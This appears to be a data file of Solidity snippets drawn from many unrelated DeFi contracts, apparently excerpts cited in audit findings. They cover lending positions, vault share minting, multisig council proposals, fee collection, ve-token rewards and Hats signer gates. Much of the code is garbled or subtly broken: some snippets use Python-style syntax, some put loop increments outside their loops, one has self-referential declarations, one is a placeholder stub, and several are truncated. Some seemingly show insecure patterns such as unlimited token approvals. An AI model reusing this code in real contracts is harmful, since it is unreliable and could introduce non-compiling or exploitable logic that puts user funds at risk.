code
"```\n(\n    netPnLE36,\n    lenderProfitUSDValueE36,\n    borrowTotalUSDValueE36,\n    positionOpenUSDValueE36,\n    sharingProfitTokenAmts\n) = calcProfitInfo(_positionManager, _user, _posId);\n\nuint lenderLiquidationPremiumBPS = IConfig(config).lenderLiquidatePremiumBPS();\n\nfor (uint i = 0; i < sharingProfitTokenAmts.length; i++) {\n    sharingProfitTokenAmts[i] += (pos.openTokenInfos[i].borrowAmt * lenderLiquidationPremiumBPS) / BPS;\n}\n```\n```\nfunction _shareProfitsAndRepayAllDebts(\n    address _positionManager,\n    address _posOwner,\n    uint _posId,\n    int _netPnLE36,\n    uint[] memory _shareProfitAmts,\n    address[] memory _tokens,\n    OpenTokenInfo[] memory _openTokenInfos\n) internal {\n    // 0. load states\n    address _lendingProxy = lendingProxy;\n\n    // 1. if net pnl is positive, share profits to lending proxy\n    if (_netPnLE36 > 0) {\n        for (uint i = 0; i < _shareProfitAmts.length; i++) {\n            if (_shareProfitAmts[i] > 0) {\n                ILendingProxy(_lendingProxy).shareProfit(_tokens[i], _shareProfitAmts[i]);\n            }\n        }\n        emit ProfitShared(_posOwner, _posId, _tokens, _shareProfitAmts);\n    }\n}\n```\nuint[] underlyingAmts = new uint[](underlyingTokens.length);\n\nfor (uint i = 0; i < underlyingTokens.length; i++) {\n    underlyingAmts[i] = IERC20(underlyingTokens[i]).balanceOf(address(this));\n\n    if (underlyingAmts[i] < _params.minUnderlyingAmts[i]) {\n        revert TokenAmountLessThanExpected(\n            underlyingTokens[i],\n            underlyingAmts[i],\n            _params.minUnderlyingAmts[i]\n        );\n    }\n    _doRefund(underlyingTokens[i], underlyingAmts[i]);\n}\nunchecked {\n    i++;\n}\n```"
"```\nuint deltaTime;\n\nif (pos.startLiqTimestamp > 0) {\n    deltaTime = Math.max(deltaTime, block.timestamp - pos.startLiqTimestamp);\n}\n\nif (block.timestamp > pos.positionDeadline) {\n    deltaTime = Math.max(deltaTime, block.timestamp - pos.positionDeadline);\n}\n\nuint timeDiscountMultiplierE18 = Math.max(\n    IConfig(config).minLiquidateTimeDiscountMultiplierE18(),\n    ONE_E18 - deltaTime * IConfig(config).liquidateTimeDiscountGrowthRateE18()\n);\n\nuint curHealthFactorE18 = (ONE_E18 * ONE_E18) / getPositionDebtRatioE18(_positionManager, _user, _posId);\nuint minDesiredHealthFactorE18 = IConfig(config).minDesiredHealthFactorE18s(strategy);\n\nuint healthDiscountMultiplierE18 = ONE_E18;\nif (curHealthFactorE18 < ONE_E18) {\n    healthDiscountMultiplierE18 = curHealthFactorE18 > minDesiredHealthFactorE18\n       ? ((curHealthFactorE18 - minDesiredHealthFactorE18) * ONE_E18) / (ONE_E18 - minDesiredHealthFactorE18)\n        : 0;\n}\n\nliquidationDiscountMultiplierE18 = (timeDiscountMultiplierE18 * healthDiscountMultiplierE18) / ONE_E18;\n```"
"```\nfunction _mintInternal(address _receiver, uint _balanceIncreased, uint _totalAsset) internal returns (uint mintShares) {\n    unfreezeTime[_receiver] = block.timestamp + mintFreezeInterval;\n    if (freezeBuckets.interval > 0) {\n        FreezeBuckets.addToFreezeBuckets(freezeBuckets, _balanceIncreased.toUint96());\n    }\n    uint _totalSupply = totalSupply();\n    if (_totalAsset == 0 || _totalSupply == 0) {\n        mintShares = _balanceIncreased + _totalAsset;\n    } else {\n        mintShares = (_balanceIncreased * _totalSupply) / _totalAsset;\n    }\n    if (mintShares == 0) {\n        revert ZeroAmount();\n    }\n    _mint(_receiver, mintShares);\n}\n```"
```\nuint inputTotalUSDValueE36;\nfor (uint i = 0; i < openTokenInfos.length; i++) {\n    inputTotalUSDValueE36 += openTokenInfos[i].inputAmt * tokenPriceE36s[i];\n    borrowTotalUSDValueE36 += openTokenInfos[i].borrowAmt * tokenPriceE36s[i];\n}\nunchecked {\n    i++;\n}\n\npositionOpenUSDValueE36 = inputTotalUSDValueE36 + borrowTotalUSDValueE36;\nnetPnLE36 = positionCurUSDValueE36.toInt256() - positionOpenUSDValueE36.toInt256();\n```
"```\nfunction increaseLiquidity(IncreaseLiquidityParams calldata params)\n    external payable override checkDeadline(params.deadline)\n    returns (uint128 liquidity, uint256 amount0, uint256 amount1)\n{\n    Position storage position = _positions[params.tokenId];\n    PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];\n    IUniswapV3Pool pool;\n    (liquidity, amount0, amount1, pool) = addLiquidity(\n```\n```\nfunction _redeemPosition(\n    address _user,\n    uint _posId\n) internal override returns (address[] memory rewardTokens, uint[] memory rewardAmts) {\n    address _positionManager = positionManager;\n    uint128 collAmt = IUniswapV3PositionManager(_positionManager).getPositionCollAmt(_user, _posId);\n\n    _takeAllCollTokens(_positionManager, _user, _posId, address(this));\n\n    UniV3ExtraPosInfo memory extraPosInfo = IUniswapV3PositionManager(_positionManager).getDecodedExtraPosInfo(_user, _posId);\n    address _uniswapV3NPM = uniswapV3NPM; // gas saving\n\n    IUniswapV3NPM(_uniswapV3NPM).decreaseLiquidity(\n        IUniswapV3NPM.DecreaseLiquidityParams({\n            tokenId: extraPosInfo.uniV3PositionId,\n            liquidity: collAmt,\n            amount0Min: 0,\n            amount1Min: 0,\n            deadline: block.timestamp\n        }\n    ));\n\n    // rest of code\n    IUniswapV3NPM(_uniswapV3NPM).burn(extraPosInfo.uniV3PositionId);\n}\n```\n```\nfunction burn(uint256 tokenId) external payable override isAuthorizedForToken(tokenId) {\n    Position storage position = _positions[tokenId];\n\n    require(position.liquidity == 0 && position.tokensOwed0 == 0 && position.tokensOwed1 == 0, 'Not cleared');\n\n    delete _positions[tokenId];\n    _burn(tokenId);\n}\n```"
"```\nfor (uint i = 0; i < _statuses.length; ) {\n    whitelistedRouters[_routers[i]] = _statuses[i];\n    if (_statuses[i]) {\n        routerTypes[_routers[i]] = _types[i];\n        emit SetRouterType(_routers[i], _types[i]);\n    }\n    emit SetWhitelistedRouter(_routers[i], _statuses[i]);\n    unchecked {\n        i++;\n    }\n}\n```"
```\nfor (uint i; i < swapParams.length; ) {\n    uint swapAmt = swapParams[i].operation == SwapOperation.EXACT_IN\n       ? IERC20(swapParams[i].tokenIn).balanceOf(address(this)) - openTokenInfos[i].borrowAmt\n        : openTokenInfos[i].borrowAmt - IERC20(swapParams[i].tokenOut).balanceOf(address(this));\n    swapAmt = (swapAmt * swapParams[i].percentSwapE18) / ONE_E18;\n    if (swapAmt == 0) {\n        revert SwapZeroAmount();\n    }\n    i++;\n}\n```
"```\nfunction _mintInternal(address _receiver, uint _balanceIncreased, uint _totalAsset)\n    internal\n    returns (uint mintShares)\n{\n    unfreezeTime[_receiver] = block.timestamp + mintFreezeInterval;\n    if (freezeBuckets.interval > 0) {\n        FreezeBuckets.addToFreezeBuckets(freezeBuckets, _balanceIncreased.toUint96());\n    }\n}\n```"
```\nstruct tradeInput {\n    address spendToken;\n    address receiveToken;\n    uint256 spendAmt;\n    uint256 receiveAmtMin;\n    address routerAddress;\n    uint256 pathIndex;\n}\n```
"```\nif (D == 0) {\n    uint256 sumDenoms = 0;\n    for (uint256 i = 0; i < tkns.length; i++) {\n        sumDenoms += AI.getAllowedTokenInfo(tkns[i]).initialDenominator;\n    }\n    require(sumDenoms > 0 && sumDenoms <= maxInitialDenominator, ""invalid sumDenoms"");\n    deltaN = sumDenoms;\n    // this ensures precision in the vault's balances. User Balance = (N*T)/D will have rounding errors always 1 wei or less.\n} else {\n    // deltaN = (amt * D)/T;\n    deltaN = Arithmetic.overflowResistantFraction(amt, D, T);\n}\n```"
"```\nprivate mapping(address => mapping(address => List<Info>) allowedPairsMap;\nprivate pair[] allowedPairsList;\n```\n```\nstruct listInfo {\n    bool allowed;\n    uint256 listPosition;\n}\n\nstruct pair {\n    address token0;\n    address token1;\n    uint256 numPathsAllowed;\n}\n```\n```\nfunction _increasePairPaths(address token0, address token1) private {\n    listInfo storage LI = allowedPairsMap[token0][token1];\n\n    if (!LI.allowed) {\n        LI.allowed = true;\n        LI.listPosition = allowedPairsList.length;\n        allowedPairsList.push(pair(token0, token1, 0));\n    }\n\n    allowedPairsList[LI.listPosition].numPathsAllowed++;\n}\n```\nfunction _decreasePairPaths(address token0, address token1) private {\n    listInfo storage LI = allowedPairsMap[token0][token1];\n    require(LI.allowed, ""RouterInfo: pair not allowed"");\n    allowedPairsList[LI.listPosition].numPathsAllowed--;\n\n    if (allowedPairsList[LI.listPosition].numPathsAllowed == 0) {\n        allowedPairsList[LI.listPosition] = allowedPairsList[allowedPairsList.length - 1];\n        allowedPairsList.pop();\n        LI.allowed = false;\n    }\n}\n```"
"```\nuint256[] memory balances = vlt.balances();\nrequire(functions.ratiosMatch(balances, amts), ""ratios don't match"");\n```\n```\nfor (uint256 i = 0; i < sourceRatios.length; i++) {\n    if (targetRatios[i]!= Arithmetic.overflowResistantFraction(targetRatios[greatestIndex], sourceRatios[i], greatest)) {\n        return false;\n    }\n```"
"```\nfor (uint256 i = 0; i < balances.length; i++) {\n    if (i == indexOfReferenceToken) {\n        amtsNeeded[i] = amtIn;\n    } else {\n        amtsNeeded[i] = Arithmetic.overflowResistantFraction(amtIn, balances[i], balances[indexOfReferenceToken]);\n    }\n}"
"```\nfor (uint i = 0; i < tokens.length; i++) {\n    IERC20(tokens[i]).safeIncreaseAllowance(ownerIn, type(uint256).max);\n}\n```"
"```\nfunction addWithdrawRequest(uint256 _amountMLP, address _token) external {\n    require(isAcceptingToken(_token), ""ERROR: Invalid token"");\n    require(_amountMLP!= 0, ""ERROR: Invalid amount"");\n\n    address _withdrawer = msg.sender;\n\n    RequestBuffer storage _pendingBuffer = _requests(false);\n    RequestBuffer storage _stagedBuffer = _requests(true);\n\n    uint256 _bookedAmountMLP = _stagedBuffer.withdrawAmountPerUser[_withdrawer] + \n        _pendingBuffer.withdrawAmountPerUser[_withdrawer];\n\n    require(_bookedAmountMLP + _amountMLP <= \n        MozaicLP(mozLP).balanceOf(_withdrawer), ""Withdraw amount > amount MLP"");\n\n    emit WithdrawRequestAdded(_withdrawer, _token, chainId, _amountMLP);\n}\n```\n```\nMozaicLP(mozLP).burn(request.user, _mlpToBurn)\n```"
"```\nif (proposals[_proposalId].actionType == TYPE_DEL_OWNER) {\n    (address _owner) = abi.decode(proposals[_proposalId].payload, (address));\n    require(contains(_owner)!= 0, ""Invalid owner address"");\n    uint index = contains(_owner);\n    for (uint256 i = index; i < councilMembers.length - 1; i++) {\n        councilMembers[i] = councilMembers[i + 1];\n    }\n    councilMembers.pop();\n    proposals[_proposalId].executed = true;\n    isCouncil[_owner] = false;\n}\n```\n```\nfunction contains(address _owner) public view returns (uint) {\n    for (uint i = 1; i <= councilMembers.length; i++) {\n        if (councilMembers[i - 1] == _owner) {\n            return i;\n        }\n    }\n    return 0;\n}\n```"
"```\nfunction submitProposal(uint8 _actionType, bytes memory _payload) public onlyCouncil {\n    uint256 proposalId = proposalCount;\n    proposals[proposalId] = Proposal(msg.sender, _actionType, _payload, 0, false);\n    proposalCount += 1;\n    emit ProposalSubmitted(proposalId, msg.sender);\n}\n```\n```\nfunction confirmTransaction(uint256 _proposalId) public onlyCouncil notConfirmed(_proposalId) {\n    confirmations[_proposalId][msg.sender] = true;\n    proposals[_proposalId].confirmation += 1;\n    emit Confirmation(_proposalId, msg.sender);\n}\n```"
"```\nconstructor(\n    address _layerZeroEndpoint,\n    uint8 _sharedDecimals\n) public OFTV2(""Mozaic Token"", ""MOZ"", _sharedDecimals, _layerZeroEndpoint) {\n    _mint(msg.sender, 1000000000 * 10 ** _sharedDecimals);\n    isAdmin[msg.sender] = true;\n}\n```"
"```\nif (proposals[_proposalId].actionType == TYPE_MINT_BURN) {\n    (address _token, address _to, uint256 _amount, bool _flag) = \n        abi.decode(proposals[_proposalId].payload, (address, address, uint256, bool));\n\n    if (_flag) {\n        IXMozToken(_token).mint(_amount, _to);\n    } else {\n        IXMozToken(_token).burn(_amount, _to);\n    }\n    proposals[_proposalId].executed = true;\n}\n```\n```\nfunction execute(uint256 _proposalId) public onlyCouncil {\n    require(proposals[_proposalId].executed == false, ""Error: Proposal already executed."");\n    require(proposals[_proposalId].confirmation >= threshold, ""Error: Not enough confirmations."");\n}\n```"
"```\nfunction _beforeTokenTransfer(address from, address to, uint256 /*amount*/) internal view override {\n    require(from == address(0) || _transferWhitelist.contains(from) || _transferWhitelist.contains(to), ""transfer: not allowed"");\n}\n```"
"```\nfunction updateTransferWhitelist(address account, bool add) external onlyMultiSigAdmin {\n    require(account!= address(this), ""updateTransferWhitelist: Cannot remove xMoz from whitelist"");\n    if (add) {\n        _transferWhitelist.add(account);\n    } else {\n        _transferWhitelist.remove(account);\n    }\n    emit SetTransferWhitelist(account, add);\n}\n```"
"```\nif (feeToken == ETH) {\n    uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n    totalFee = _applyMultiplier(totalFee);\n    return (totalFee, recipient, TokenTransfer._nativeTransferExec(recipient, totalFee));\n} else {\n    uint256 totalFee = (gasUsed + GAS_OVERHEAD_ERC20) * tx.gasprice;\n    uint256 feeToCollect = PriceFeedManager(_addressProvider.priceFeedManager()).getTokenXPriceInY(totalFee, ETH, feeToken);\n    feeToCollect = _applyMultiplier(feeToCollect);\n    return (feeToCollect, recipient, TokenTransfer._erc20TransferExec(feeToken, recipient, feeToCollect));\n}\n```"
"```\nmodifier claimExecutionFees(address _wallet) {\n    uint256 startGas = gasleft();\n    if (feeMultiplier > 0) {\n        address feeToken = FeePayer._feeToken(_wallet);\n        uint256 gasUsed = startGas - gasleft();\n        (uint256 feeAmount, address recipient, Types.Executable memory feeTransferTxn) = FeePayer._buildFeeExecutable(gasUsed, feeToken);\n        emit FeeClaimed(_wallet, feeToken, feeAmount);\n        if (feeToken!= ETH) {\n            uint256 initialBalance = IERC20(feeToken).balanceOf(recipient);\n            executeSafeERC20Transfer(_wallet, feeTransferTxn);\n            if (IERC20(feeToken).balanceOf(recipient) - initialBalance < feeAmount) {\n                revert UnsuccessfulFeeTransfer(_wallet, feeToken);\n            }\n        } else {\n            uint256 initialBalance = recipient.balance;\n            Executor._executeOnWallet(_wallet, feeTransferTxn);\n            if (recipient.balance - initialBalance < feeAmount) {\n                revert UnsuccessfulFeeTransfer(_wallet, feeToken);\n            }\n        }\n    }\n}\n```"
"```\nfunction canInitSwap(address subAccount, address inputToken, uint256 interval, uint256 lastSwap)\n    external\n    view\n    returns (bool)\n{\n    if (hasZeroBalance(subAccount, inputToken)) {\n        return false;\n    }\n    return ((lastSwap + interval) < block.timestamp);\n}\n```"
"```\nuint16 public feeMultiplier = 10_000;\n\n/**\n * @notice feeMultiplier represents the total fee to be charged on the transaction\n * @dev In case feeMultiplier is less than BASE_BPS, fees charged will be less than 100%,\n *     subsidizing the transaction\n * In case feeMultiplier is greater than BASE_BPS, fees charged will be greater than 100%,\n *     charging the user for the transaction\n */\n\nif (feeToken == ETH) {\n    uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n    totalFee = _applyMultiplier(totalFee);\n    return (totalFee, recipient, TokenTransfer._nativeTransferExec(recipient, totalFee));\n} else {\n```"
"```\nfunction _executeAutomation(\n    address _wallet,\n    address _subAccount,\n    address _strategy,\n    Types.Executable[] memory _actionExecs\n) internal {\n    uint256 actionLen = _actionExecs.length;\n\n    if (actionLen == 0) {\n        revert InvalidActions();\n    } else {\n        uint256 idx = 0;\n        do {\n            _executeOnSubAccount(_wallet, _subAccount, _strategy, _actionExecs[idx]);\n            unchecked {\n                ++idx;\n            }\n        } while (idx < actionLen);\n    }\n}\n```"
"```\nfunction deploySpareSubAccount(address _wallet) external {\n    address subAccount = SafeDeployer(addressProvider.safeDeployer()).deploySubAccount(_wallet);\n    subAccountToWalletMap[subAccount] = _wallet;\n    walletToSubAccountMap[_wallet].push(subAccount);\n    emit SubAccountAllocated(_wallet, subAccount);\n}\n```\n```\nfunction requestSubAccount(address _wallet) external returns (address) {\n    if (msg.sender!= subscriptionRegistry) \n        revert OnlySubscriptionRegistryCallable();\n    address[] memory subAccountList = walletToSubAccountMap[_wallet];\n```"
```\nif (inputTokenBalance < params.amountToSwap) {\n    uint256 amountIn = inputTokenBalance;\n} else {\n    uint256 amountIn = params.amountToSwap;\n}
"```\nfunction upgradeWalletType() external {\n    if (!isWallet(msg.sender)) {\n        revert WalletDoesntExist(msg.sender);\n    }\n    uint8 fromWalletType = _walletDataMap[msg.sender].walletType;\n    _setWalletType(msg.sender, _upgradablePaths[fromWalletType]);\n    emit WalletUpgraded(msg.sender, fromWalletType, _upgradablePaths[fromWalletType]);\n}\n```\n```\nfunction _setWalletType(address _wallet, uint8 _walletType) private {\n    _walletDataMap[_wallet].walletType = _walletType;\n}\n```\n```\nfunction isWallet(address _wallet) public view returns (bool) {\n    WalletData memory walletData = _walletDataMap[_wallet];\n    if (walletData.walletType == 0 || walletData.feeToken == address(0)) {\n        return false;\n    }\n    return true;\n}\n```"
"```\nTypes.TokenRequest[] memory tokens = new Types.TokenRequest[](1);\ntokens[0] = Types.TokenRequest({token: inputToken, amount: amountIn});\namountIn = amountIn / iterations;\n\nStrategyParams memory params = StrategyParams({\n    tokenIn: inputToken,\n    tokenOut: outputToken,\n    amountToSwap: amountIn,\n    interval: interval,\n    remitToOwner: remitToOwner\n});\n```"
"```\nTypes.Executable({\n    callType: Types.CallType.DELEGATECALL,\n    target: dcaCoWAutomation,\n    value: 0,\n    data: abi.encodeCall(\n        DCACoWAutomation.initiateSwap,\n        (params.tokenIn, params.tokenOut, swapRecipient, amountIn, minAmountOut, swapFee)\n    )\n})\n```\nfunction setSwapFee(uint256 _swapFee) external {\n    _onlyGov();\n    if (_swapFee > 10_000) {\n        revert InvalidSlippage();\n    }\n    swapFee = _swapFee;\n}\n\nif (feeBps > 0) {\n    if (feeBps > 1_000) {\n        revert FeeTooHigh();\n    }\n    amountIn = amountToSwap * (MAX_BPS - feeBps) / MAX_BPS;\n}\n```"
```\nfunction _nonReentrantAfter() internal virtual {\n    _reentrancyStatus = false;\n}\n```
"```\nfunction _verifyCall(address logicVerifier) internal virtual returns (bool verifyAfter) {\n    (bool success, bytes memory returnedData) = logicVerifier.call(\n        abi.encodeWithSelector(ILSP20.lsp20VerifyCall.selector, msg.sender, msg.value, msg.data)\n    );\n\n    if (!success) {\n        _revert(false, returnedData);\n    }\n\n    if (returnedData.length < 32) {\n        revert LSP20InvalidMagicValue(false, returnedData);\n    }\n\n    bytes32 magicValue = abi.decode(returnedData, (bytes32));\n\n    if (bytes32(magicValue)!= ILSP20.lsp20VerifyCall.selector) {\n        revert LSP20InvalidMagicValue(false, returnedData);\n    }\n\n    return bytes1(magicValue[3]) == 0x01? true : false;\n}\n```"
"```\nbytes32 lsp1typeIdDelegateKey = LSP2Utils.generateMappingKey(\n    _LSP1_UNIVERSAL_RECEIVER_DELEGATE_PREFIX,\n    bytes20(typeId)\n)"
```\nfunction supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n    return interfaceId == _INTERFACEID_LSP6 || interfaceId == _INTERFACEID_ERC1271 ||\n        super.supportsInterface(interfaceId);\n}\n```
"```\nfunction transferOwnership(address newPendingOwner) external payable;\nfunction renounceOwnership() external payable;\n```\n```\nfunction transferOwnership(address newOwner) public virtual override(LSP14Ownable2Step, OwnableUnset) {\n```\n```\nfunction renounceOwnership() public virtual override {\n    address _owner = owner();\n```"
"```\nif (\n    mapPrefix == _LSP10_VAULTS_MAP_KEY_PREFIX &&\n    notifier.code.length > 0 &&\n   !notifier.supportsERC165InterfaceUnchecked(_INTERFACEID_LSP9)\n) {\n    return ""LSP1: not an LSP9Vault ownership transfer"";\n}\n```"
"```\nbytes memory encodedMessage = abi.encodePacked(\n    LSP6_VERSION,\n    block.chainid,\n    nonce,\n    msgValue,\n    payload\n);"
```\nif ((lockEndTime - oldUserPoint.ts) > (minLockDurationForReward)):\n    toDistribute += (balanceOf * tokensPerWeek[weekCursor]) / veSupply[weekCursor]\n    weekCursor += WEEK\n```
```\nif ((lockEndTime - weekCursor) > (minLockDurationForReward)) {\n    toDistribute += (balanceOf * tokensPerWeek[weekCursor]) / veSupply[weekCursor];\n    weekCursor += WEEK;\n}\n```
"```\nrequire(_poolWeights <= _calculateMaxVotePossible(_pool), ""Max votes exceeded"")\n```\n```\nreturn ((totalVotingPower * maxVotesForPool[_pool]) / 100)"
"```\nuint _claimable = claimable[_gauge];\n\nif (SATIN_CASH_LP_GAUGE == _gauge) {\n    veShare = calculateSatinCashLPVeShare(_claimable);\n    _claimable -= veShare;\n}\n\nif (_claimable > IMultiRewardsPool(_gauge).left(token) && _claimable / DURATION > 0) {\n    claimable[_gauge] = 0;\n    if (is4poolGauge[_gauge]) {\n        IGauge(_gauge).notifyRewardAmount(token, _claimable, true);\n    } else {\n        IGauge(_gauge).notifyRewardAmount(token, _claimable, false);\n    }\n    emit DistributeReward(msg.sender, _gauge, _claimable);\n}\n```"
```\nCheckpoint memory cp = checkpoints[tokenId][_endIndex];\nuint _lastEpochStart = _bribeStart(cp.timestamp);\nuint _lastEpochEnd = _lastEpochStart + DURATION;\n\nif (block.timestamp > _lastEpochEnd) {\n    reward += (cp.balanceOf * \n               tokenRewardsPerEpoch[token][_lastEpochStart]) / \n               supplyCheckpoints[getPriorSupplyIndex(_lastEpochEnd)].supply;\n}\n```
```\nif ((lockEndTime - weekCursor) > (minLockDurationForReward)):\n    toDistribute += (balanceOf * tokensPerWeek[weekCursor]) / veSupply[weekCursor]\n    weekCursor += WEEK\n```
```\nuint256 timeElapsed = blockTimestamp - blockTimestampLast;\n\nif (timeElapsed > 0 && _reserve0!= 0 && _reserve1!= 0) {\n    reserve0CumulativeLast += _reserve0 * timeElapsed;\n    reserve1CumulativeLast += _reserve1 * timeElapsed;\n}\n```
"```\nfunction createGauge4pool(\n    address _4pool,\n    address _dai,\n    address _usdc,\n    address _usdt,\n    address _cash\n) external returns (address) {\n```"
```\nif ((lockEndTime - weekCursor) > (minLockDurationForReward)):\n    toDistribute += (balanceOf * tokensPerWeek[weekCursor]) / veSupply[weekCursor]\n    weekCursor += WEEK\n```
"```\n/// @notice Internal call to mint a Hat token to a wearer\n/// @dev Unsafe if called when `_wearer` has a non-zero balance of `_hatId`\n/// @param _wearer The wearer of the Hat and the recipient of the newly minted token\n/// @param _hatId The id of the Hat to mint\nfunction _mintHat(address _wearer, uint256 _hatId) internal {\n    unchecked {\n        _balanceOf[_wearer][_hatId] = 1;\n        _hats[_hatId].supply++;\n    }\n    emit TransferSingle(msg.sender, address(0), _wearer, _hatId, 1);\n}\n```\n```\nfunction mintHat(uint256 _hatId, address _wearer) public returns (bool) {\n    Hat memory hat = _hats[_hatId];\n    if (hat.maxSupply == 0) {\n        revert HatDoesNotExist(_hatId);\n    }\n    // only the wearer of a hat's admin Hat can mint it\n    _checkAdmin(_hatId);\n    if (hat.supply >= hat.maxSupply) {\n        revert AllHatsWorn(_hatId);\n    }\n    if (isWearerOfHat(_wearer, _hatId)) {\n        revert AlreadyWearingHat(_wearer, _hatId);\n    }\n    _mintHat(_wearer, _hatId);\n    return true;\n}"
"```\nuint256 safeOwnerCount = safe.getOwners().length;\nif (safeOwnerCount < minThreshold) {\n    revert BelowMinThreshold(minThreshold, safeOwnerCount);\n}\n```\n```\nuint256 validSigCount = countValidSignatures(txHash, signatures, signatures.length / 65);\n\nif (validSigCount < safe.getThreshold()) {\n    revert InvalidSigners();\n}\n```"
"```\nuint256 validSigCount = countValidSignatures(txHash, signatures, signatures.length / 65);\n\nif (validSigCount < safe.getThreshold()) {\n    revert InvalidSigners();\n}\n```"
```\nfunction claimSigner() public virtual {\n    if (signerCount == maxSigners) {\n        revert MaxSignersReached();\n    }\n    if (safe.isOwner(msg.sender)) {\n        revert SignerAlreadyClaimed(msg.sender);\n    }\n    if (!isValidSigner(msg.sender)) {\n        revert NotSignerHatWearer(msg.sender);\n    }\n    _grantSigner(msg.sender);\n}\n```
```\nuint32 lastTopHatId = uint256(++lastTopHatId) << 224;\n```
```\nfunction getHatLevel(uint256 _hatId) public view returns (uint8) {\n    /// @notice Identifies the level a given hat in its hat tree\n    /// @param _hatId the id of the hat in question\n    /// @return level (0 to uint8.max)\n    // Your code here\n}\n```\n```\nif (treeAdmin!= 0) {\n    return 1 + uint8(i) + getHatLevel(treeAdmin);\n}
"```\nbytes memory initializeParams = abi.encode(\n    _ownerHatId, \n    _signersHatId, \n    _safe, \n    hatsAddress, \n    _minThreshold, \n    _targetThreshold, \n    _maxSigners, \n    version\n);\n\nhsg = moduleProxyFactory.deployModule(\n    hatsSignerGateSingleton, \n    abi.encodeWithSignature(""setUp(bytes)"", initializeParams), \n    _saltNonce\n);\n```\n```\nproxy = createProxy(masterCopy, keccak256(abi.encodePacked(keccak256(initializer), saltNonce)))\n```\n```\nfunction createProxy(address target, bytes32 salt) internal returns (address result) {\n    if (address(target) == address(0)) {\n        revert ZeroAddress(target);\n    }\n    if (address(target).code.length == 0) {\n        revert TargetHasNoCode(target);\n    }\n    bytes memory deployment = abi.encodePacked(\n        hex""602d8060093d393df3363d3d373d3d363d73"", target, hex""5af43d82803e903d91602b57fd5bf3""\n    );\n    assembly {\n        result := create2(0, add(deployment, 0x20), mload(deployment), salt)\n    }\n    if (result == address(0)) {\n        revert TakenAddress(result);\n    }\n}\n```"
"```\nfunction checkAfterExecution(bytes32, bool) external override {\n    if (abi.decode(StorageAccessible(address(safe)).getStorageAt(uint256(GUARD_STORAGE_SLOT), 1), (address))!= address(this)) {\n        revert CannotDisableThisGuard(address(this));\n    }\n    if (!IAvatar(address(safe)).isModuleEnabled(address(this))) {\n        revert CannotDisableProtectedModules(address(this));\n    }\n    if (safe.getThreshold()!= _correctThreshold()) {\n        revert SignersCannotChangeThreshold();\n    }\n    // leave checked to catch underflows triggered by re-entry\n    attempts--;\n    --guardEntries;\n}\n```"
"```\nfunction createHat(\n    uint256 _admin,\n    string memory _details,\n    uint32 _maxSupply,\n    address _eligibility,\n    address _toggle,\n    bool _mutable,\n    string memory _imageURI\n) public returns (uint256 newHatId) {\n    if (uint8(_admin) > 0) {\n        revert MaxLevelsReached();\n    }\n   ....\n}\n```"
"```\nfunction getImageURIForHat(uint256 _hatId) public view returns (string memory) {\n    Hat memory hat = _hats[_hatId];\n    string memory imageURI = hat.imageURI; // save 1 SLOAD\n\n    if (bytes(imageURI).length > 0) {\n        return imageURI;\n    }\n\n    uint256 level = getHatLevel(_hatId);\n\n    if (level == 0) {\n        return baseImageURI;\n    }\n\n    uint256 id;\n    for (uint256 i = level - 1; i > 0; ) {\n        id = getAdminAtLevel(_hatId, uint8(i));\n        hat = _hats[id];\n        imageURI = hat.imageURI;\n        if (bytes(imageURI).length > 0) {\n            return imageURI;\n        }\n        unchecked {\n            --i;\n        }\n    }\n\n    return baseImageURI;\n}"
"```\nfunction _isActive(Hat memory _hat, uint256 _hatId) internal view returns (bool) {\n    bytes memory data = abi.encodeWithSignature(""getHatStatus(uint256)"", _hatId);\n    (bool success, bytes memory returnData) = _hat.toggle.staticcall(data);\n    if (success && returnData.length > 0) {\n        return abi.decode(returnData, (bool));\n    } else {\n        return _getHatStatus(_hat);\n    }\n}\n```"
```\nfunction initialize() external initializer {\n    __Ownable_init();\n}\n```
"```\nif (isLong) {\n    uint swapFeeBP = getSwapFeeBP(isLong, true, collateralDelta);\n    collateralDelta = (collateralDelta * (BASIS_POINTS_DIVISOR + swapFeeBP)) / BASIS_POINTS_DIVISOR;\n}\n\ncollateralDelta += _getPositionFee(currentPos.size, sizeDelta, currentPos.entryFundingRate);\n```"
"```\nif (withdrawalValue < lpParams.minDepositWithdraw &&\n    amountLiquidityToken < lpParams.minDepositWithdraw) {\n    revert MinimumWithdrawNotMet(address(this), withdrawalValue, lpParams.minDepositWithdraw);\n}\n```"
```\nuint tokenInPrice = _getMinPrice(address(baseAsset));\nuint tokenOutPrice = _getMaxPrice(address(quoteAsset));\n\nuint minOut = tokenInPrice\n   .multiplyDecimal(marketPricingParams[_optionMarket].minReturnPercent)\n   .multiplyDecimal(_amountBase)\n   .divideDecimal(tokenOutPrice);\n```
"```\nif (token == quoteAsset || token == baseAsset || token == weth) {\n    revert CannotRecoverRestrictedToken(address(this));\n}\ntoken.transfer(recipient, token.balanceOf(address(this)));\n```"
```\nfunction setPositionRouter(IPositionRouter _positionRouter) external onlyOwner {\n    positionRouter = _positionRouter;\n    router.approvePlugin(address(positionRouter));\n    emit PositionRouterSet(_positionRouter);\n}\n```
```\nreceive() external payable {}\n```
"```\nif (block.timestamp <= lastProfitTime) {\n    revert NYProfitTakingVault__ProfitTimeOutOfBounds();\n}\n```\nfunction harvest() external override whenNotPaused returns (uint256 callerFee) {\n    require(lastHarvestTimestamp!= block.timestamp);\n\n    uint256 harvestSeconds = lastHarvestTimestamp > 0\n       ? block.timestamp - lastHarvestTimestamp\n        : 0;\n\n    lastHarvestTimestamp = block.timestamp;\n\n    uint256 sentToVault;\n    uint256 underlyingTokenCount;\n\n    (callerFee, underlyingTokenCount, sentToVault) = _harvestCore();\n\n    emit StrategyHarvest(msg.sender, underlyingTokenCount, harvestSeconds, sentToVault);\n}\n```\n```\nfunction _harvestCore() internal override returns (uint256 callerFee, uint256 underlyingTokenCount, uint256 sentToVault) {\n    IMasterChef(SPOOKY_SWAP_FARM_V2).deposit(POOL_ID, 0);\n    _swapFarmEmissionTokens();\n    callerFee = _chargeFees();\n    underlyingTokenCount = balanceOf();\n    sentToVault = _sendYieldToVault();\n}\n```\n```\nfunction _sendYieldToVault() internal returns (uint256 sentToVault) {\n    sentToVault = IERC20Upgradeable(USDC).balanceOf(address(this));\n    if (sentToVault > 0) {\n        IERC20Upgradeable(USDC).approve(vault, sentToVault);\n        